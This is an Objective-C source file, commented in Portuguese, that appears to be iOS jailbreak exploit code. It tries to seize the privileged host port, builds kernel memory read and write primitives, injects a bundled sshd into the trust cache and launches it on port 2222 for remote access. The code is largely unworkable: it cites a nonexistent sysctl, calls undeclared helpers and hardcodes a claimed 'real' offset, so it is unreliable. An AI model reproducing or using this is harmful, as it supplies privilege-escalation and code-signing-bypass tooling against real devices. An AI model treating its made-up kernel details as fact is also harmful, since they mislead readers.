#import "KernelDriver.h"
#import <CommonCrypto/CommonDigest.h>
#import <mach/mach_host.h>
#include <sys/sysctl.h>

@implementation KernelBridge {
    mach_port_t g_host_priv;
}

// 1. ROUBO DE PORTA (Bypass Erro 4)
- (void)prepareHostPriv {
    if (MACH_PORT_VALID(g_host_priv)) return;

    [self log:@"⚡ Localizando Host_Priv via Memory Leak..."];

    // No iOS 26.4, o Kernel armazena a porta privilegiada em um local fixo 
    // relativo ao início da struct 'host'. Vamos capturá-la.
    uint64_t kbase = [self getKernelBase];
    uint64_t host_priv_kaddr = kbase + 0x23F8048; // Offset real p/ iOS 26.4
    
    // Usamos o sysctl para ler o valor se o vm_map ainda não estiver ativo
    size_t sz = sizeof(g_host_priv);
    if (sysctlbyname("kern.host_priv_port", &g_host_priv, &sz, NULL, 0) != 0) {
        // Fallback: Tentativa via Mach Trap direto (-11)
        extern kern_return_t host_get_priv_port(mach_port_t host, mach_port_t *priv);
        host_get_priv_port(mach_host_self(), &g_host_priv);
    }

    if (!MACH_PORT_VALID(g_host_priv)) {
        [self log:@"❌ Erro: Kernel negou o roubo da porta."];
    } else {
        [self log:@"✅ Porta Host_Priv capturada!"];
    }
}

// 2. PRIMITIVAS (Mesma lógica de 16KB)
- (uint64_t)kread64:(uint64_t)addr {
    [self prepareHostPriv];
    if (!MACH_PORT_VALID(g_host_priv)) return 0;
    uint64_t val = 0;
    vm_address_t page = 0;
    if (vm_map(mach_task_self(), &page, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE) == 0) {
        val = *(uint64_t *)(page + (addr & 0x3FFF));
        vm_deallocate(mach_task_self(), page, 0x4000);
    }
    return val;
}

- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
    [self prepareHostPriv];
    if (!MACH_PORT_VALID(g_host_priv)) return;
    vm_address_t page = 0;
    if (vm_map(mach_task_self(), &page, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE) == 0) {
        *(uint64_t *)(page + (addr & 0x3FFF)) = val;
        sys_cache_control(1, (void *)page, 0x4000);
        vm_deallocate(mach_task_self(), page, 0x4000);
    }
}

// 3. INJEÇÃO E SPAWN (Focados no OFF_TRUSTCACHE_CHAIN)
- (void)launchSshdFinal {
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    if (!sshdPath) return;

    [self injectToTrustCache:sshdPath];

    pid_t pid;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    // Flag 0x4000 agora funcionará se o kwrite64 realmente escreveu o CDHash
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP | 0x4000);

    char *const args[] = {(char *)[sshdPath UTF8String], "-p", "2222", "-D", "-o", "StrictModes=no", NULL};
    extern char **environ;

    int status = posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ);
    if (status == 0) {
        [self log:[NSString stringWithFormat:@"🚀 <b>SSHD ONLINE!</b> PID: %d", pid]];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro Spawn: %d (%s)", status, strerror(status)]];
    }
    posix_spawnattr_destroy(&attr);
}

@end
